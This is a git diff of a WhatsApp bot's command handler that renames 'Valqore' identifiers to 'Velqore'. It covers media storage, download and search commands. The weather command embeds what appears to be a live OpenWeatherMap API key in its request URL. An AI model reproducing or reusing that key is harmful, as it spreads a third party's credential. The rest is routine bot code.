-replygcValqore(`Success deleting video ${q}`)
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (args.length < 1) return replygcVelqore('Enter the video name')
+if (!VideoVelqore.includes(q)) return replygcVelqore("The name does not exist in the database")
+let wanu = VideoVelqore.indexOf(q)
+VideoVelqore.splice(wanu, 1)
+fs.writeFileSync('./VelqoreMedia/database/Velqorevideo.json', JSON.stringify(VideoVelqore))
+fs.unlinkSync(`./VelqoreMedia/video/${q}.mp4`)
+replygcVelqore(`Success deleting video ${q}`)
 }
 break
 case 'listvideo':{
 let teks = '┌──⭓「 *Video List* 」\n│\n'
-for (let x of VideoValqore) {
+for (let x of VideoVelqore) {
 teks += `│⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoValqore.length}*`
-replygcValqore(teks)
+teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoVelqore.length}*`
+replygcVelqore(teks)
 }
 break
 case 'addimage':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (args.length < 1) return replygcValqore('Whats the image name?')
-if (ImageValqore.includes(q)) return replygcValqore("The name is already in use")
-let delb = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-ImageValqore.push(q)
-await fsx.copy(delb, `./ValqoreMedia/image/${q}.jpg`)
-fs.writeFileSync('./ValqoreMedia/database/Valqoreimage.json', JSON.stringify(ImageValqore))
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (args.length < 1) return replygcVelqore('Whats the image name?')
+if (ImageVelqore.includes(q)) return replygcVelqore("The name is already in use")
+let delb = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+ImageVelqore.push(q)
+await fsx.copy(delb, `./VelqoreMedia/image/${q}.jpg`)
+fs.writeFileSync('./VelqoreMedia/database/Velqoreimage.json', JSON.stringify(ImageVelqore))
 fs.unlinkSync(delb)
-replygcValqore(`Success Adding Image\nCheck by typing ${prefix}listimage`)
+replygcVelqore(`Success Adding Image\nCheck by typing ${prefix}listimage`)
 }
 break
 case 'delimage':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (args.length < 1) return replygcValqore('Enter the image name')
-if (!ImageValqore.includes(q)) return replygcValqore("The name does not exist in the database")
-let wanu = ImageValqore.indexOf(q)
-ImageValqore.splice(wanu, 1)
-fs.writeFileSync('./ValqoreMedia/database/Valqoreimage.json', JSON.stringify(ImageValqore))
-fs.unlinkSync(`./ValqoreMedia/image/${q}.jpg`)
-replygcValqore(`Success deleting image ${q}`)
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (args.length < 1) return replygcVelqore('Enter the image name')
+if (!ImageVelqore.includes(q)) return replygcVelqore("The name does not exist in the database")
+let wanu = ImageVelqore.indexOf(q)
+ImageVelqore.splice(wanu, 1)
+fs.writeFileSync('./VelqoreMedia/database/Velqoreimage.json', JSON.stringify(ImageVelqore))
+fs.unlinkSync(`./VelqoreMedia/image/${q}.jpg`)
+replygcVelqore(`Success deleting image ${q}`)
 }
 break
 case 'listimage':{
 let teks = '┌──⭓「 *Image List* 」\n│\n'
-for (let x of ImageValqore) {
+for (let x of ImageVelqore) {
 teks += `│⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageValqore.length}*`
-replygcValqore(teks)
+teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageVelqore.length}*`
+replygcVelqore(teks)
 }
 break
 case 'addsticker':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (args.length < 1) return replygcValqore('Whats the sticker name?')
-if (StickerValqore.includes(q)) return replygcValqore("The name is already in use")
-let delb = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-StickerValqore.push(q)
-await fsx.copy(delb, `./ValqoreMedia/sticker/${q}.webp`)
-fs.writeFileSync('./ValqoreMedia/database/Valqoresticker.json', JSON.stringify(StickerValqore))
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (args.length < 1) return replygcVelqore('Whats the sticker name?')
+if (StickerVelqore.includes(q)) return replygcVelqore("The name is already in use")
+let delb = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+StickerVelqore.push(q)
+await fsx.copy(delb, `./VelqoreMedia/sticker/${q}.webp`)
+fs.writeFileSync('./VelqoreMedia/database/Velqoresticker.json', JSON.stringify(StickerVelqore))
 fs.unlinkSync(delb)
-replygcValqore(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
+replygcVelqore(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
 }
 break
 case 'delsticker':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (args.length < 1) return replygcValqore('Enter the sticker name')
-if (!StickerValqore.includes(q)) return replygcValqore("The name does not exist in the database")
-let wanu = StickerValqore.indexOf(q)
-StickerValqore.splice(wanu, 1)
-fs.writeFileSync('./ValqoreMedia/database/Valqoresticker.json', JSON.stringify(StickerValqore))
-fs.unlinkSync(`./ValqoreMedia/sticker/${q}.webp`)
-replygcValqore(`Success deleting sticker ${q}`)
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (args.length < 1) return replygcVelqore('Enter the sticker name')
+if (!StickerVelqore.includes(q)) return replygcVelqore("The name does not exist in the database")
+let wanu = StickerVelqore.indexOf(q)
+StickerVelqore.splice(wanu, 1)
+fs.writeFileSync('./VelqoreMedia/database/Velqoresticker.json', JSON.stringify(StickerVelqore))
+fs.unlinkSync(`./VelqoreMedia/sticker/${q}.webp`)
+replygcVelqore(`Success deleting sticker ${q}`)
 }
 break
 case 'liststicker':{
 let teks = '┌──⭓「 *Sticker List* 」\n│\n'
-for (let x of StickerValqore) {
+for (let x of StickerVelqore) {
 teks += `│⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerValqore.length}*`
-replygcValqore(teks)
+teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerVelqore.length}*`
+replygcVelqore(teks)
 }
 break
 case 'addmsg': {
-	if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!m.quoted) return replygcValqore('Reply Message You Want To Save In Database')
-                if (!text) return replygcValqore(`Example : ${prefix + command} filename`)
+	if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!m.quoted) return replygcVelqore('Reply Message You Want To Save In Database')
+                if (!text) return replygcVelqore(`Example : ${prefix + command} filename`)
                 let msgs = global.db.data.database
-                if (text.toLowerCase() in msgs) return replygcValqore(`'${text}' registered in the message list`)
+                if (text.toLowerCase() in msgs) return replygcVelqore(`'${text}' registered in the message list`)
                 msgs[text.toLowerCase()] = quoted.fakeObj
-replygcValqore(`Successfully added message in message list as '${text}'
+replygcVelqore(`Successfully added message in message list as '${text}'
     
 Access with ${prefix}getmsg ${text}
 
@@ -3810,10 +3806,10 @@ View list of Messages With ${prefix}listmsg`)
             }
             break
             case 'getmsg': {
-                if (!text) return replygcValqore(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
+                if (!text) return replygcVelqore(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                 let msgs = global.db.data.database
-                if (!(text.toLowerCase() in msgs)) return replygcValqore(`'${text}' not listed in the message list`)
-                ValqoreInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
+                if (!(text.toLowerCase() in msgs)) return replygcVelqore(`'${text}' not listed in the message list`)
+                VelqoreInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
             }
             break
             case 'listmsg': {
@@ -3823,170 +3819,170 @@ View list of Messages With ${prefix}listmsg`)
 		for (let i of seplit) {
 		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
 	        }
-	        replygcValqore(teks)
+	        replygcVelqore(teks)
 	    }
 	    break 
 	case 'delmsg': case 'deletemsg': {
-		if (!ValqoreTheCreator) return ValqoreStickOwner()
+		if (!VelqoreTheCreator) return VelqoreStickOwner()
 	        let msgs = global.db.data.database
-	        if (!(text.toLowerCase() in msgs)) return replygcValqore(`'${text}' not listed in the message list`)
+	        if (!(text.toLowerCase() in msgs)) return replygcVelqore(`'${text}' not listed in the message list`)
 		delete msgs[text.toLowerCase()]
-		replygcValqore(`Successfully deleted '${text}' from the message list`)
+		replygcVelqore(`Successfully deleted '${text}' from the message list`)
             }
 	    break
 case 'addvn':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (args.length < 1) return replygcValqore('Whats the audio name?')
-if (VoiceNoteValqore.includes(q)) return replygcValqore("The name is already in use")
-let delb = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-VoiceNoteValqore.push(q)
-await fsx.copy(delb, `./ValqoreMedia/audio/${q}.mp3`)
-fs.writeFileSync('./ValqoreMedia/database/Valqorevn.json', JSON.stringify(VoiceNoteValqore))
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (args.length < 1) return replygcVelqore('Whats the audio name?')
+if (VoiceNoteVelqore.includes(q)) return replygcVelqore("The name is already in use")
+let delb = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+VoiceNoteVelqore.push(q)
+await fsx.copy(delb, `./VelqoreMedia/audio/${q}.mp3`)
+fs.writeFileSync('./VelqoreMedia/database/Velqorevn.json', JSON.stringify(VoiceNoteVelqore))
 fs.unlinkSync(delb)
-replygcValqore(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
+replygcVelqore(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
 }
 break
 case 'delvn':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (args.length < 1) return replygcValqore('Enter the vn name')
-if (!VoiceNoteValqore.includes(q)) return replygcValqore("The name does not exist in the database")
-let wanu = VoiceNoteValqore.indexOf(q)
-VoiceNoteValqore.splice(wanu, 1)
-fs.writeFileSync('./ValqoreMedia/database/Valqorevn.json', JSON.stringify(VoiceNoteValqore))
-fs.unlinkSync(`./ValqoreMedia/audio/${q}.mp3`)
-replygcValqore(`Success deleting vn ${q}`)
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (args.length < 1) return replygcVelqore('Enter the vn name')
+if (!VoiceNoteVelqore.includes(q)) return replygcVelqore("The name does not exist in the database")
+let wanu = VoiceNoteVelqore.indexOf(q)
+VoiceNoteVelqore.splice(wanu, 1)
+fs.writeFileSync('./VelqoreMedia/database/Velqorevn.json', JSON.stringify(VoiceNoteVelqore))
+fs.unlinkSync(`./VelqoreMedia/audio/${q}.mp3`)
+replygcVelqore(`Success deleting vn ${q}`)
 }
 break
 case 'listvn':{
 let teks = '┌──⭓「 *VN List* 」\n│\n'
-for (let x of VoiceNoteValqore) {
+for (let x of VoiceNoteVelqore) {
 teks += `│⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteValqore.length}*`
-replygcValqore(teks)
+teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteVelqore.length}*`
+replygcVelqore(teks)
 }
 break
 case 'addzip':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
+if (!VelqoreTheCreator) return VelqoreStickOwner()
 
-if (args.length < 1) return replygcValqore(`What's the zip name?`)
+if (args.length < 1) return replygcVelqore(`What's the zip name?`)
 let teks = `${text}`
 {
-if (ZipValqore.includes(teks)) return replygcValqore("This name is already in use")
-let delb = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-ZipValqore.push(teks)
-await fsx.copy(delb, `./ValqoreMedia/zip/${teks}.zip`)
-fs.writeFileSync('./ValqoreMedia/database/zip.json', JSON.stringify(ZipValqore))
+if (ZipVelqore.includes(teks)) return replygcVelqore("This name is already in use")
+let delb = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+ZipVelqore.push(teks)
+await fsx.copy(delb, `./VelqoreMedia/zip/${teks}.zip`)
+fs.writeFileSync('./VelqoreMedia/database/zip.json', JSON.stringify(ZipVelqore))
 fs.unlinkSync(delb)
-replygcValqore(`Success Adding zip\nTo check type ${prefix}listzip`)
+replygcVelqore(`Success Adding zip\nTo check type ${prefix}listzip`)
 }
 }
 break
 case 'delzip':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
+if (!VelqoreTheCreator) return VelqoreStickOwner()
 
-if (args.length < 1) return replygcValqore('Enter the text in the zip list')
+if (args.length < 1) return replygcVelqore('Enter the text in the zip list')
 let teks = `${text}`
 {
-if (!ZipValqore.includes(teks)) return replygcValqore("This name does not exist in the database")
-let wanu = ZipValqore.indexOf(teks)
-ZipValqore.splice(wanu, 1)
-fs.writeFileSync('./ValqoreMedia/database/zip.json', JSON.stringify(ZipValqore))
-fs.unlinkSync(`./ValqoreMedia/zip/${teks}.zip`)
-replygcValqore(`Successfully deleted zip ${teks}`)
+if (!ZipVelqore.includes(teks)) return replygcVelqore("This name does not exist in the database")
+let wanu = ZipVelqore.indexOf(teks)
+ZipVelqore.splice(wanu, 1)
+fs.writeFileSync('./VelqoreMedia/database/zip.json', JSON.stringify(ZipVelqore))
+fs.unlinkSync(`./VelqoreMedia/zip/${teks}.zip`)
+replygcVelqore(`Successfully deleted zip ${teks}`)
 }
 }
 break
 case 'listzip': {
 
 let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
-for (let x of ZipValqore) {
+for (let x of ZipVelqore) {
 teksooooo += `│⭔ ${x}\n`
 }
-teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipValqore.length}*`
-replygcValqore(teksooooo)
+teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipVelqore.length}*`
+replygcVelqore(teksooooo)
 }
 break
 case 'addapk':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
+if (!VelqoreTheCreator) return VelqoreStickOwner()
 
-if (args.length < 1) return replygcValqore('What is the name of the apk?')
+if (args.length < 1) return replygcVelqore('What is the name of the apk?')
 let teks = `${text}`
 {
-if (ApkValqore.includes(teks)) return replygcValqore("This name is already in use")
-let delb = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+if (ApkVelqore.includes(teks)) return replygcVelqore("This name is already in use")
+let delb = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
 apknye.push(teks)
-await fsx.copy(delb, `./ValqoreMedia/apk/${teks}.apk`)
-fs.writeFileSync('./ValqoreMedia/database/apk.json', JSON.stringify(ApkValqore))
+await fsx.copy(delb, `./VelqoreMedia/apk/${teks}.apk`)
+fs.writeFileSync('./VelqoreMedia/database/apk.json', JSON.stringify(ApkVelqore))
 fs.unlinkSync(delb)
-replygcValqore(`Successful Adding apk\nTo Check type ${prefix}listapk`)
+replygcVelqore(`Successful Adding apk\nTo Check type ${prefix}listapk`)
 }
 }
 break
 case 'delapk':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
+if (!VelqoreTheCreator) return VelqoreStickOwner()
 
-if (args.length < 1) return replygcValqore('Name of the apk?')
+if (args.length < 1) return replygcVelqore('Name of the apk?')
 let teks = `${text}`
 {
-if (!ApkValqore.includes(teks)) return replygcValqore("This name does not exist in the database")
-let wanu = ApkValqore.indexOf(teks)
-ApkValqore.splice(wanu, 1)
-fs.writeFileSync('./ValqoreMedia/database/apk.json', JSON.stringify(ApkValqore))
-fs.unlinkSync(`./ValqoreMedia/apk/${teks}.apk`)
-replygcValqore(`Successfully deleted Apk ${teks}`)
+if (!ApkVelqore.includes(teks)) return replygcVelqore("This name does not exist in the database")
+let wanu = ApkVelqore.indexOf(teks)
+ApkVelqore.splice(wanu, 1)
+fs.writeFileSync('./VelqoreMedia/database/apk.json', JSON.stringify(ApkVelqore))
+fs.unlinkSync(`./VelqoreMedia/apk/${teks}.apk`)
+replygcVelqore(`Successfully deleted Apk ${teks}`)
 }
 }
 break
 case 'listapk': {
 
 let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
-for (let x of ApkValqore) {
+for (let x of ApkVelqore) {
 teksoooooo += `│⭔ ${x}\n`
 }
-teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkValqore.length}`
-replygcValqore(teksoooooo)
+teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkVelqore.length}`
+replygcVelqore(teksoooooo)
 }
 break
 case 'addpdf':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
+if (!VelqoreTheCreator) return VelqoreStickOwner()
 
-if (args.length < 1) return replygcValqore('What is the name of the pdf')
+if (args.length < 1) return replygcVelqore('What is the name of the pdf')
 let teks = `${text}`
 {
-if (DocValqore.includes(teks)) return replygcValqore("This name is already in use")
-let delb = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-DocValqore.push(teks)
-await fsx.copy(delb, `./ValqoreMedia/doc/${teks}.pdf`)
-fs.writeFileSync('./ValqoreMedia/database/doc.json', JSON.stringify(DocValqore))
+if (DocVelqore.includes(teks)) return replygcVelqore("This name is already in use")
+let delb = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+DocVelqore.push(teks)
+await fsx.copy(delb, `./VelqoreMedia/doc/${teks}.pdf`)
+fs.writeFileSync('./VelqoreMedia/database/doc.json', JSON.stringify(DocVelqore))
 fs.unlinkSync(delb)
-replygcValqore(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
+replygcVelqore(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
 }
 }
 break
 case 'delpdf':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
+if (!VelqoreTheCreator) return VelqoreStickOwner()
 
-if (args.length < 1) return replygcValqore('Enter the name')
+if (args.length < 1) return replygcVelqore('Enter the name')
 let teks = `${text}`
 {
-if (!DocValqore.includes(teks)) return replygcValqore("This name does not exist in the database")
-let wanu = DocValqore.indexOf(teks)
-DocValqore.splice(wanu, 1)
-fs.writeFileSync('./ValqoreMedia/database/doc.json', JSON.stringify(DocValqore))
-fs.unlinkSync(`./ValqoreMedia/doc/${teks}.pdf`)
-replygcValqore(`Successfully deleted pdf ${teks}`)
+if (!DocVelqore.includes(teks)) return replygcVelqore("This name does not exist in the database")
+let wanu = DocVelqore.indexOf(teks)
+DocVelqore.splice(wanu, 1)
+fs.writeFileSync('./VelqoreMedia/database/doc.json', JSON.stringify(DocVelqore))
+fs.unlinkSync(`./VelqoreMedia/doc/${teks}.pdf`)
+replygcVelqore(`Successfully deleted pdf ${teks}`)
 }
 }
 break
 case 'listpdf': {
 
 let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
-for (let x of DocValqore) {
+for (let x of DocVelqore) {
 teksoooo += `│⭔ ${x}\n`
 }
-teksoooo += `│\n└────────────⭓\n\n*Total : ${DocValqore.length}*`
-replygcValqore(teksoooo)
+teksoooo += `│\n└────────────⭓\n\n*Total : ${DocVelqore.length}*`
+replygcVelqore(teksoooo)
 }
 break
 case 'sound1':
@@ -4150,50 +4146,50 @@ case 'sound158':
 case 'sound159':
 case 'sound160':
 case 'sound161':
-ValqoreInc_dev = await getBuffer(`https://github.com/Valqore/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
-await ValqoreInc.sendMessage(m.chat, { audio: ValqoreInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
+VelqoreInc_dev = await getBuffer(`https://github.com/Velqore/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
+await VelqoreInc.sendMessage(m.chat, { audio: VelqoreInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 break
 case 'friend':
 case 'searchfriend':{
-await ValqoreStickWait()
-let teman = pickRandom(Valqoreverifieduser)
+await VelqoreStickWait()
+let teman = pickRandom(Velqoreverifieduser)
 setTimeout(() => {
 }, 1000)
 setTimeout(() => {
-replygcValqore('Managed to Get One Person')
+replygcVelqore('Managed to Get One Person')
 }, 5000)
 setTimeout(() => {
-ValqoreInc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
+VelqoreInc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
 }, 9000)
 }
 break
 case 'q': case 'quoted': {
-if (!m.quoted) return replygcValqore('Reply the Message!!')
-let Valqorequotx= await ValqoreInc.serializeM(await m.getQuotedObj())
-if (!Valqorequotx.quoted) return replygcValqore('The message you are replying to is not sent by the bot')
-await Valqorequotx.quoted.copyNForward(m.chat, true)
+if (!m.quoted) return replygcVelqore('Reply the Message!!')
+let Velqorequotx= await VelqoreInc.serializeM(await m.getQuotedObj())
+if (!Velqorequotx.quoted) return replygcVelqore('The message you are replying to is not sent by the bot')
+await Velqorequotx.quoted.copyNForward(m.chat, true)
 }
 break
 case 'obfus': case 'obfuscate':{
-if (!q) return replygcValqore(`Example ${prefix+command} const Valqorebot = require('baileys')`)
+if (!q) return replygcVelqore(`Example ${prefix+command} const Velqorebot = require('baileys')`)
 let meg = await obfus(q)
-replygcValqore(`Success
+replygcVelqore(`Success
 ${meg.result}`)
 }
 break
 case 'style': case 'styletext': {
 		let { styletext } = require('./lib/scraper')
-		if (!text) return replygcValqore('Enter Query text!')
+		if (!text) return replygcVelqore('Enter Query text!')
                 let anu = await styletext(text)
                 let teks = `Style Text From ${text}\n\n`
                 for (let i of anu) {
                     teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                 }
-                replygcValqore(teks)
+                replygcVelqore(teks)
 	    }
 	    break
 case 'yts': case 'ytsearch': {
-                if (!text) return replygcValqore(`Example : ${prefix + command} story wa anime`)
+                if (!text) return replygcVelqore(`Example : ${prefix + command} story wa anime`)
                 let yts = require("yt-search")
                 let search = await yts(text)
                 let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
@@ -4201,17 +4197,17 @@ case 'yts': case 'ytsearch': {
                 for (let i of search.all) {
                     teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                 }
-                ValqoreInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
+                VelqoreInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
             }
             break
             case 'play':  case 'song': {
-if (!text) return replygcValqore(`Example : ${prefix + command} anime whatsapp status`)
-const Valqoreplaymp3 = require('./lib/ytdl')
+if (!text) return replygcVelqore(`Example : ${prefix + command} anime whatsapp status`)
+const Velqoreplaymp3 = require('./lib/ytdl')
 let yts = require("youtube-yts")
         let search = await yts(text)
         let anup3k = search.videos[0]
-const pl= await Valqoreplaymp3.mp3(anup3k.url)
-await ValqoreInc.sendMessage(m.chat,{
+const pl= await Velqoreplaymp3.mp3(anup3k.url)
+await VelqoreInc.sendMessage(m.chat,{
     audio: fs.readFileSync(pl.path),
     fileName: anup3k.title + '.mp3',
     mimetype: 'audio/mp4', ptt: true,
@@ -4231,10 +4227,10 @@ await fs.unlinkSync(pl.path)
 }
 break
 case 'ytmp3': case 'ytaudio':
-let Valqoreaudp3 = require('./lib/ytdl')
-if (args.length < 1 || !isUrl(text) || !Valqoreaudp3.isYTUrl(text)) return replygcValqore(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
-let audio = await Valqoreaudp3.mp3(text)
-await ValqoreInc.sendMessage(m.chat,{
+let Velqoreaudp3 = require('./lib/ytdl')
+if (args.length < 1 || !isUrl(text) || !Velqoreaudp3.isYTUrl(text)) return replygcVelqore(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
+let audio = await Velqoreaudp3.mp3(text)
+await VelqoreInc.sendMessage(m.chat,{
     audio: fs.readFileSync(audio.path),
     mimetype: 'audio/mp4', ptt: true,
     contextInfo:{
@@ -4251,50 +4247,50 @@ await ValqoreInc.sendMessage(m.chat,{
 await fs.unlinkSync(audio.path)
 break
 case 'ytmp4': case 'ytvideo': {
-const Valqorevidoh = require('./lib/ytdl')
-if (args.length < 1 || !isUrl(text) || !Valqorevidoh.isYTUrl(text)) replygcValqore(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
-const vid=await Valqorevidoh.mp4(text)
+const Velqorevidoh = require('./lib/ytdl')
+if (args.length < 1 || !isUrl(text) || !Velqorevidoh.isYTUrl(text)) replygcVelqore(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
+const vid=await Velqorevidoh.mp4(text)
 const ytc=`
 *${themeemoji}Tittle:* ${vid.title}
 *${themeemoji}Date:* ${vid.date}
 *${themeemoji}Duration:* ${vid.duration}
 *${themeemoji}Quality:* ${vid.quality}`
-await ValqoreInc.sendMessage(m.chat,{
+await VelqoreInc.sendMessage(m.chat,{
     video: {url:vid.videoUrl},
     caption: ytc
 },{quoted:m})
 }
 break
 case 'git': case 'gitclone':
-if (!args[0]) return replygcValqore(`Where is the link?\nExample :\n${prefix}${command} https://github.com/Valqore/ValqoreMedia`)
-if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcValqore(`Link invalid!!`)
+if (!args[0]) return replygcVelqore(`Where is the link?\nExample :\n${prefix}${command} https://github.com/Velqore/VelqoreMedia`)
+if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcVelqore(`Link invalid!!`)
 let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     let [, user, repo] = args[0].match(regex1) || []
     repo = repo.replace(/.git$/, '')
     let url = `https://api.github.com/repos/${user}/${repo}/zipball`
     let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
-    ValqoreInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcValqore(mess.error))
+    VelqoreInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcVelqore(mess.error))
 break
 case 'tiktok':{
-if (!q) return replygcValqore( `Example : ${prefix + command} link`)
-if (!q.includes('tiktok')) return replygcValqore(`Link Invalid!!`)
+if (!q) return replygcVelqore( `Example : ${prefix + command} link`)
+if (!q.includes('tiktok')) return replygcVelqore(`Link Invalid!!`)
 require('./lib/tiktok').Tiktok(q).then( data => {
-ValqoreInc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
+VelqoreInc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
 })
 }
 break
 case 'tiktokaudio':{
-if (!q) return replygcValqore( `Example : ${prefix + command} link`)
-if (!q.includes('tiktok')) return replygcValqore(`Link Invalid!!`)
+if (!q) return replygcVelqore( `Example : ${prefix + command} link`)
+if (!q.includes('tiktok')) return replygcVelqore(`Link Invalid!!`)
 require('./lib/tiktok').Tiktok(q).then( data => {
-const Valqoretikmp3 = {url:data.audio}
-ValqoreInc.sendMessage(m.chat, { audio: Valqoretikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
+const Velqoretikmp3 = {url:data.audio}
+VelqoreInc.sendMessage(m.chat, { audio: Velqoretikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
 })
 }
 break
 case 'google': {
-if (!q) return replygcValqore(`Example : ${prefix + command} ${botname}`)
-await ValqoreStickWait()
+if (!q) return replygcVelqore(`Example : ${prefix + command} ${botname}`)
+await VelqoreStickWait()
 let google = require('google-it')
 google({'query': text}).then(res => {
 let teks = `Google Search From : ${text}\n\n`
@@ -4303,12 +4299,12 @@ teks += `⭔ *Title* : ${g.title}\n`
 teks += `⭔ *Description* : ${g.snippet}\n`
 teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
 } 
-replygcValqore(teks)
+replygcVelqore(teks)
 })
 }
 break
 case 'weather':{
-if (!text) return replygcValqore('What location?')
+if (!text) return replygcVelqore('What location?')
             let wdata = await axios.get(
                 `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
             );
@@ -4325,7 +4321,7 @@ if (!text) return replygcValqore('What location?')
             textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
             textw += `*Country:-* ${wdata.data.sys.country}\n`
 
-           ValqoreInc.sendMessage(
+           VelqoreInc.sendMessage(
                 m.chat, {
                     text: textw,
                 }, {
@@ -4337,11 +4333,11 @@ if (!text) return replygcValqore('What location?')
            case 'fb':
            case 'facebook': {
            if (!args[0]) {
-    return replygcValqore(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
+    return replygcVelqore(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
   }
   const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
   if (!urlRegex.test(args[0])) {
-    return replygcValqore('Url invalid')
+    return replygcVelqore('Url invalid')
   }
   try {
     const result = await fg.fbdl(args[0]);
@@ -4351,14 +4347,14 @@ ${themeemoji} Title: ${result.title}`;
     const response = await fetch(result.videoUrl)
     const arrayBuffer = await response.arrayBuffer()
     const videoBuffer = Buffer.from(arrayBuffer)
-    ValqoreInc.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
+    VelqoreInc.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
   } catch (error) {
-    replygcValqore('Maybe private video!')
+    replygcVelqore('Maybe private video!')
   }
   }
   break
 case 'tiktokstalk': {
